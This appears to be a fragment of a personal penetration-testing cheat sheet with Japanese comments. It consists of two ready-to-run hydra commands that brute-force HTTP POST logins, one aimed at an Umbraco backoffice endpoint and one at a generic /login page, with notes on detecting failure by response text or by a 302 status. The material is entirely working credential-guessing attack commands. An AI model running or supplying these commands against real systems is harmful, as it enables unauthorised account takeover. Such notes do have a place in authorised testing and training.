## ## http/https
```sh
# POST Method
## ↓文字一致で判断(部分一致でもOK)
hydra -L /opt/wordlists/names.txt -p baconandcheese http-post-form "//umbraco/backoffice/UmbracoApi/Authentication/PostLogin:"username":"^USER^","password":"^PASS^":F=failed"

## ステータスベース(誤検知が多いので注意)
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:S=302"
```